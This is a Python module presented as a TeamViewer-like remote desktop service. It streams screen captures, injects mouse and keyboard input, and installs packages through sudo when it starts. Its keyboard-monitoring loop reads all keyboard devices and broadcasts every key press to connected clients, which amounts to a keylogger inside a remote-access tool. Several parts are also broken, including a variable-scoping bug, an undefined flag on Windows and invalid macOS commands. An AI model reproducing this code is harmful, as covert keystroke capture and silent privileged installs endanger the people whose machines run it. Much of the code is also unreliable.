"""
Remote Screen Control Module
Provides TeamViewer-like remote desktop functionality with auto-tool installation
Cross-platform: Windows, Linux, macOS
"""

import os
import sys
import io
import base64
import threading
import time
import subprocess
import platform
from datetime import datetime
from PIL import Image
from flask import Flask, render_template, send_file
from flask_socketio import SocketIO, emit

try:
    import mss
    import mss.tools
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False

# Platform-specific imports
IS_WINDOWS = platform.system() == 'Windows'
IS_MACOS = platform.system() == 'Darwin'
IS_LINUX = platform.system() == 'Linux'

try:
    if IS_WINDOWS:
        import pyautogui
        PYAUTOGUI_AVAILABLE = True
    elif IS_LINUX:
        import evdev
        EVDEV_AVAILABLE = True
    else:
        PYAUTOGUI_AVAILABLE = False
        EVDEV_AVAILABLE = False
except ImportError:
    PYAUTOGUI_AVAILABLE = False
    EVDEV_AVAILABLE = False

class RemoteScreen:
    """Remote screen capture and control"""
    
    def __init__(self, config=None):
        self.config = config
        self.running = False
        self.screen_thread = None
        self.mouse_thread = None
        self.keyboard_thread = None
        self.socketio = None
        self.clients = []
        self.last_screenshot = None
        self.screenshot_interval = 0.3  # ~3 FPS for smoother feed
        self.mouse_position = {'x': 0, 'y': 0}
        self.mouse_buttons = {'left': False, 'middle': False, 'right': False}
        self.key_states = {}
        self.screen_size = {'width': 1920, 'height': 1080}
        
        # Detect system and auto-install tools
        self.system_type = self._detect_system()
        self._auto_install_tools()
        
    def _detect_system(self):
        """Detect operating system type"""
        try:
            system = platform.system()
            if system == 'Windows':
                return 'windows'
            elif system == 'Darwin':
                return 'macos'
            elif os.path.exists('/etc/debian_version'):
                return 'debian'
            elif os.path.exists('/etc/redhat-release'):
                return 'redhat'
            elif os.path.exists('/etc/arch-release'):
                return 'arch'
            elif os.path.exists('/etc/suse-release'):
                return 'suse'
            return 'unknown'
        except:
            return 'unknown'
    
    def _check_tool(self, tool):
        """Check if a tool is installed"""
        try:
            if IS_WINDOWS:
                result = subprocess.run(['where', tool], capture_output=True, text=True)
            else:
                result = subprocess.run(['which', tool], capture_output=True, text=True)
            return result.returncode == 0
        except:
            return False
    
    def _auto_install_tools(self):
        """Auto-install required tools based on system type"""
        print(f"[*] Detected system: {self.system_type} ({platform.system()})")
        
        if IS_WINDOWS:
            # Windows: Check for pyautogui
            if not PYAUTOGUI_AVAILABLE:
                print("[*] Installing pyautogui for Windows...")
                try:
                    subprocess.run([sys.executable, '-m', 'pip', 'install', 'pyautogui'], 
                                 capture_output=True, timeout=120)
                    try:
                        import pyautogui
                        PYAUTOGUI_AVAILABLE = True
                        print("[+] pyautogui installed successfully")
                    except ImportError:
                        print("[!] pyautogui installation failed")
                except Exception as e:
                    print(f"[*] Could not install pyautogui: {e}")
            else:
                print("[+] pyautogui already installed")
                
        elif IS_LINUX:
            # Linux: Install xdotool and imagemagick
            tools_needed = []
            
            if not self._check_tool('xdotool'):
                tools_needed.append('xdotool')
            if not self._check_tool('import'):
                tools_needed.append('imagemagick')
            
            if not tools_needed:
                print("[+] All Linux screen control tools already installed")
                return
            
            print(f"[*] Installing Linux tools: {', '.join(tools_needed)}")
            
            try:
                if self.system_type == 'debian':
                    subprocess.run(['sudo', 'apt-get', 'update'], capture_output=True, timeout=60)
                    subprocess.run(['sudo', 'apt-get', 'install', '-y'] + tools_needed, 
                                 capture_output=True, timeout=120)
                elif self.system_type == 'redhat':
                    subprocess.run(['sudo', 'dnf', 'install', '-y'] + tools_needed, 
                                 capture_output=True, timeout=120)
                elif self.system_type == 'arch':
                    subprocess.run(['sudo', 'pacman', '-S', '--noconfirm'] + tools_needed, 
                                 capture_output=True, timeout=120)
                
                print("[+] Linux screen control tools installed successfully")
                
            except Exception as e:
                print(f"[*] Tool install warning (may still work): {e}")
        
        elif IS_MACOS:
            print("[*] macOS: Screen capture works, mouse control limited")
            print("[*] Consider installing: brew install xdotool")
        
        print(f"[+] Screen control ready for {platform.system()}")
    
    def start(self, socketio=None):
        """Start the remote screen service"""
        self.socketio = socketio
        self.running = True
        
        # Get screen size
        self._update_screen_size()
        
        # Start screen capture thread
        self.screen_thread = threading.Thread(target=self._capture_loop)
        self.screen_thread.daemon = True
        self.screen_thread.start()
        
        # Start input threads if available
        if EVDEV_AVAILABLE:
            self.mouse_thread = threading.Thread(target=self._mouse_loop)
            self.mouse_thread.daemon = True
            self.mouse_thread.start()
            
            self.keyboard_thread = threading.Thread(target=self._keyboard_loop)
            self.keyboard_thread.daemon = True
            self.keyboard_thread.start()
            
        print("[+] Remote screen service started")
        
    def stop(self):
        """Stop the remote screen service"""
        self.running = False
        if self.screen_thread:
            self.screen_thread.join(timeout=2)
        print("[+] Remote screen service stopped")
        
    def _update_screen_size(self):
        """Update screen dimensions"""
        try:
            if MSS_AVAILABLE:
                with mss.mss() as sct:
                    if len(sct.monitors) > 1:
                        monitor = sct.monitors[1]
                        self.screen_size = {'width': monitor.width, 'height': monitor.height}
        except:
            pass
    
    def _capture_loop(self):
        """Main screen capture loop"""
        while self.running:
            try:
                screenshot = self._capture_screen()
                if screenshot:
                    self.last_screenshot = screenshot
                    # Broadcast to all connected clients
                    if self.socketio:
                        self.socketio.emit('screen_update', {
                            'image': base64.b64encode(screenshot).decode(),
                            'timestamp': datetime.now().isoformat(),
                            'size': self.screen_size
                        })
                time.sleep(self.screenshot_interval)
            except Exception as e:
                if self.running:
                    print(f"[-] Screen capture error: {e}")
                time.sleep(1)
                
    def _capture_screen(self):
        """Capture current screen - Cross-platform with Wayland support"""
        try:
            # Check if running on Wayland
            import os
            is_wayland = os.environ.get('XDG_SESSION_TYPE') == 'wayland'
            
            # Method 1: Try pyautogui (works on most systems)
            if PYAUTOGUI_AVAILABLE:
                try:
                    import pyautogui
                    import tempfile
                    
                    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
                        temp_file = f.name
                    
                    screenshot = pyautogui.screenshot()
                    screenshot.save(temp_file)
                    
                    if os.path.exists(temp_file):
                        with open(temp_file, 'rb') as f:
                            screenshot_data = f.read()
                        os.unlink(temp_file)
                        
                        # Convert to JPEG
                        img = Image.open(io.BytesIO(screenshot_data))
                        buffer = io.BytesIO()
                        img.save(buffer, format='JPEG', quality=85)
                        return buffer.getvalue()
                except Exception as e:
                    print(f"[*] pyautogui capture failed: {e}")
            
            # Method 2: Try ImageMagick import (works on X11)
            if self._check_tool('import'):
                try:
                    import subprocess
                    import tempfile
                    
                    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
                        temp_file = f.name
                    
                    # Capture using import (ImageMagick)
                    subprocess.run(['import', '-window', 'root', temp_file], 
                                 capture_output=True, timeout=5)
                    
                    if os.path.exists(temp_file) and os.path.getsize(temp_file) > 0:
                        with open(temp_file, 'rb') as f:
                            screenshot_data = f.read()
                        os.unlink(temp_file)
                        
                        # Convert to JPEG
                        img = Image.open(io.BytesIO(screenshot_data))
                        buffer = io.BytesIO()
                        img.save(buffer, format='JPEG', quality=85)
                        return buffer.getvalue()
                except Exception as e:
                    print(f"[*] ImageMagick capture failed: {e}")
            
            # Method 3: Fallback to mss (works on X11)
            if MSS_AVAILABLE:
                try:
                    with mss.mss() as sct:
                        # Get primary monitor (index 1) or all monitors (index 0)
                        monitor = sct.monitors[1] if len(sct.monitors) > 1 else sct.monitors[0]
                        screenshot = sct.grab(monitor)
                        
                        # Convert to JPEG with good quality for live feed
                        img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
                        buffer = io.BytesIO()
                        img.save(buffer, format='JPEG', quality=85)
                        return buffer.getvalue()
                except Exception as e:
                    print(f"[*] mss capture failed: {e}")
            
            # Method 4: Try scrot (Linux)
            if self._check_tool('scrot'):
                try:
                    subprocess.run(['scrot', '-o'], capture_output=True, timeout=5, text=True)
                except:
                    pass
                        
        except Exception as e:
            print(f"[-] Screen capture failed: {e}")
        return None
        
    def _mouse_loop(self):
        """Monitor mouse events"""
        try:
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            mouse_devices = [d for d in devices if evdev.ecodes.EV_REL in d.capabilities()]
            
            for device in mouse_devices:
                if 'mouse' in device.name.lower() or 'synaptics' in device.name.lower():
                    print(f"[*] Monitoring mouse: {device.name}")
                    self._monitor_mouse(device)
        except Exception as e:
            print(f"[-] Mouse monitoring error: {e}")
            
    def _monitor_mouse(self, device):
        """Monitor a mouse device"""
        while self.running:
            try:
                for event in device.read_loop():
                    if event.type == evdev.ecodes.EV_REL:
                        if event.code == evdev.ecodes.REL_X:
                            self.mouse_position['x'] += event.value
                        elif event.code == evdev.ecodes.REL_Y:
                            self.mouse_position['y'] += event.value
                            # Send mouse position to clients
                            if self.socketio:
                                self.socketio.emit('mouse_position', self.mouse_position)
                                
                    elif event.type == evdev.ecodes.EV_KEY:
                        if event.code == evdev.ecodes.BTN_LEFT:
                            self.mouse_buttons['left'] = bool(event.value)
                        elif event.code == evdev.ecodes.BTN_MIDDLE:
                            self.mouse_buttons['middle'] = bool(event.value)
                        elif event.code == evdev.ecodes.BTN_RIGHT:
                            self.mouse_buttons['right'] = bool(event.value)
            except:
                break
                
    def _keyboard_loop(self):
        """Monitor keyboard events"""
        try:
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            keyboard_devices = [d for d in devices if evdev.ecodes.EV_KEY in d.capabilities() 
                               and 'keyboard' in d.name.lower()]
            
            for device in keyboard_devices:
                print(f"[*] Monitoring keyboard: {device.name}")
                self._monitor_keyboard(device)
        except Exception as e:
            print(f"[-] Keyboard monitoring error: {e}")
            
    def _monitor_keyboard(self, device):
        """Monitor a keyboard device"""
        while self.running:
            try:
                for event in device.read_loop():
                    if event.type == evdev.ecodes.EV_KEY and event.value:
                        key = evdev.categorize(event)
                        if key.text:
                            self.key_states[key.keysym] = True
                            # Send key press to clients
                            if self.socketio:
                                self.socketio.emit('key_press', {
                                    'key': key.text,
                                    'timestamp': datetime.now().isoformat()
                                })
                    elif event.type == evdev.ecodes.EV_KEY and not event.value:
                        key = evdev.categorize(event)
                        self.key_states[key.keysym] = False
            except:
                break
                
    def move_mouse(self, x, y):
        """Move mouse to absolute position (x, y) - Cross-platform"""
        try:
            x, y = int(x), int(y)
            
            if IS_WINDOWS and PYAUTOGUI_AVAILABLE:
                import pyautogui
                pyautogui.moveTo(x, y, duration=0.1)
            elif IS_LINUX and self._check_tool('xdotool'):
                subprocess.run(['xdotool', 'mousemove', '--sync', str(x), str(y)], 
                             capture_output=True, timeout=2)
            elif IS_MACOS:
                # macOS: Use osascript for mouse movement
                subprocess.run(['osascript', '-e', 
                              f'tell application "System Events" to set current location of front most process to {{x, y}}'],
                             capture_output=True, timeout=2)
            
            self.mouse_position = {'x': x, 'y': y}
            # Broadcast new position
            if self.socketio:
                self.socketio.emit('mouse_position', self.mouse_position)
            return True
        except Exception as e:
            print(f"[-] Move mouse error: {e}")
            return False
            
    def click_mouse(self, button='left', x=None, y=None):
        """Click mouse button at position - Cross-platform"""
        try:
            # Map button names
            button_map = {'left': 'left', 'right': 'right', 'middle': 'center'}
            btn = button_map.get(button, 'left')
            
            if IS_WINDOWS and PYAUTOGUI_AVAILABLE:
                import pyautogui
                if x is not None and y is not None:
                    pyautogui.click(x, y, button=btn)
                else:
                    pyautogui.click(button=btn)
                    
            elif IS_LINUX and self._check_tool('xdotool'):
                xdotool_btn = {'left': '1', 'right': '3', 'center': '2'}.get(btn, '1')
                if x is not None and y is not None:
                    subprocess.run(['xdotool', 'mousemove', '--sync', str(int(x)), str(int(y)), 
                                  'click', xdotool_btn], capture_output=True, timeout=2)
                else:
                    subprocess.run(['xdotool', 'click', xdotool_btn], capture_output=True, timeout=2)
                    
            elif IS_MACOS:
                # macOS: Use osascript
                click_cmd = 'click' if btn == 'left' else f'right click'
                subprocess.run(['osascript', '-e', f'tell application "System Events" to {click_cmd}'],
                             capture_output=True, timeout=2)
            
            return True
        except Exception as e:
            print(f"[-] Click mouse error: {e}")
            return False
            
    def double_click(self, x=None, y=None):
        """Double click at position - Cross-platform"""
        try:
            if IS_WINDOWS and PYAUTOGUI_AVAILABLE:
                import pyautogui
                if x is not None and y is not None:
                    pyautogui.doubleClick(x, y)
                else:
                    pyautogui.doubleClick()
                    
            elif IS_LINUX and self._check_tool('xdotool'):
                if x is not None and y is not None:
                    subprocess.run(['xdotool', 'mousemove', '--sync', str(int(x)), str(int(y)),
                                  'click', '1', 'click', '1'], capture_output=True, timeout=2)
                else:
                    subprocess.run(['xdotool', 'doubleclick', '1'], capture_output=True, timeout=2)
            
            return True
        except Exception as e:
            print(f"[-] Double click error: {e}")
            return False
            
    def type_text(self, text):
        """Type text - Cross-platform"""
        try:
            if IS_WINDOWS and PYAUTOGUI_AVAILABLE:
                import pyautogui
                pyautogui.write(text, interval=0.01)
                
            elif IS_LINUX and self._check_tool('xdotool'):
                subprocess.run(['xdotool', 'type', '--', text], 
                             capture_output=True, timeout=5)
                
            elif IS_MACOS:
                # macOS: Use pbcopy and paste
                subprocess.run(['pbcopy'], input=text.encode(), capture_output=True, timeout=2)
                subprocess.run(['osascript', '-e', 'tell application "System Events" to keystroke "v" using command down'],
                             capture_output=True, timeout=2)
            
            return True
        except Exception as e:
            print(f"[-] Type text error: {e}")
            return False
            
    def get_screen_info(self):
        """Get screen information"""
        try:
            if MSS_AVAILABLE:
                with mss.mss() as sct:
                    monitors = []
                    for i, monitor in enumerate(sct.monitors):
                        monitors.append({
                            'id': i,
                            'width': monitor['width'],
                            'height': monitor['height'],
                            'left': monitor['left'],
                            'top': monitor['top']
                        })
                    return {
                        'monitors': monitors,
                        'primary': monitors[1] if len(monitors) > 1 else monitors[0],
                        'tools': {
                            'xdotool': self._check_tool('xdotool'),
                            'imagemagick': self._check_tool('import'),
                            'mss': MSS_AVAILABLE
                        },
                        'system': self.system_type
                    }
        except Exception as e:
            print(f"[-] Get screen info error: {e}")
        return {'monitors': [], 'primary': None, 'tools': {}, 'system': self.system_type}
    
    def get_mouse_position(self):
        """Get current mouse position using xdotool"""
        try:
            result = subprocess.run(['xdotool', 'getmouselocation'], 
                                  capture_output=True, text=True, timeout=2)
            x, y = 0, 0
            for line in result.stdout.split('\n'):
                if 'x:' in line:
                    x = int(line.split(':')[1].strip())
                if 'y:' in line:
                    y = int(line.split(':')[1].strip())
            return {'x': x, 'y': y}
        except:
            return self.mouse_position
